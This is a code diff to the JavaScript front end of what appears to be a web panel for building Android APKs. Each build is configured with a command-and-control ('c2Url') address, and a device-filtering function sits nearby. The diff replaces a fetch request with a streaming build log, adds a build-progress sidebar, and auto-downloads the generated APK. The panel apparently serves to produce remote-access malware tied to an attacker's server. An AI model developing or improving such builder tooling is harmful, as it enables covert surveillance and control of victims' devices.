@@ -27,58 +27,66 @@ function buildApk() {
     const buildBtn = document.getElementById('buildBtn');
     const statusDiv = document.getElementById('buildStatus');
     const statusMsg = document.getElementById('statusMessage');
-    const downloadDiv = document.getElementById('downloadLink');
     const buildLog = document.getElementById('buildLog');
+    const dinoSidebar = document.getElementById('dinoSidebar');
     
     buildBtn.disabled = true;
     buildBtn.textContent = 'Building...';
     statusDiv.style.display = 'block';
-    statusMsg.textContent = 'Building APK, please wait... This may take a minute or more on first run.';
-    statusMsg.style.color = '#333';
-    downloadDiv.style.display = 'none';
+    statusMsg.textContent = 'Building APK, please wait...';
+    statusMsg.style.color = 'var(--text)';
     buildLog.textContent = '';
     
-    fetch('api/build.php', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-            apkName: apkName,
-            appLabel: appLabel,
-            c2Url: c2Url
-        })
-    })
-    .then(async response => {
-        const text = await response.text();
-        try {
-            return JSON.parse(text);
-        } catch (e) {
-            console.error('Server response was not JSON:', text);
-            throw new Error('Server returned an invalid response (not JSON). Check the console or logs.');
-        }
-    })
-    .then(data => {
-        buildBtn.disabled = false;
-        buildBtn.textContent = 'Build APK';
-        buildLog.textContent = data.log || '';
-        
-        if (data.success) {
-            statusMsg.textContent = 'Build successful!';
-            statusMsg.style.color = 'green';
-            downloadDiv.style.display = 'block';
-            document.getElementById('apkDownloadBtn').href = data.downloadUrl;
-        } else {
-            statusMsg.textContent = 'Build failed: ' + data.message;
-            statusMsg.style.color = 'red';
-        }
-    })
-    .catch(error => {
-        buildBtn.disabled = false;
-        buildBtn.textContent = 'Build APK';
-        statusMsg.textContent = 'Error: ' + error.message;
-        statusMsg.style.color = 'red';
+    // Open Dino Sidebar
+    dinoSidebar.classList.add('active');
+    
+    const params = new URLSearchParams({
+        apkName: apkName,
+        appLabel: appLabel,
+        c2Url: c2Url
     });
+
+    const eventSource = new EventSource('api/build.php?' + params.toString());
+    
+    eventSource.onmessage = function(event) {
+        const data = JSON.parse(event.data);
+        if (data.log) {
+            buildLog.textContent += data.log;
+            buildLog.scrollTop = buildLog.scrollHeight;
+        }
+        
+        if (data.success !== undefined) {
+            eventSource.close();
+            buildBtn.disabled = false;
+            buildBtn.textContent = 'Generate APK';
+            dinoSidebar.classList.remove('active');
+            
+            if (data.success) {
+                statusMsg.textContent = 'Build successful! Downloading...';
+                statusMsg.style.color = 'var(--success)';
+                
+                // Auto download
+                const link = document.createElement('a');
+                link.href = data.downloadUrl;
+                link.download = apkName + '.apk';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            } else {
+                statusMsg.textContent = 'Build failed.';
+                statusMsg.style.color = 'var(--error)';
+            }
+        }
+    };
+    
+    eventSource.onerror = function() {
+        eventSource.close();
+        buildBtn.disabled = false;
+        buildBtn.textContent = 'Generate APK';
+        dinoSidebar.classList.remove('active');
+        statusMsg.textContent = 'Connection error during build.';
+        statusMsg.style.color = 'var(--error)';
+    };
 }
 
 function filterDevices() {
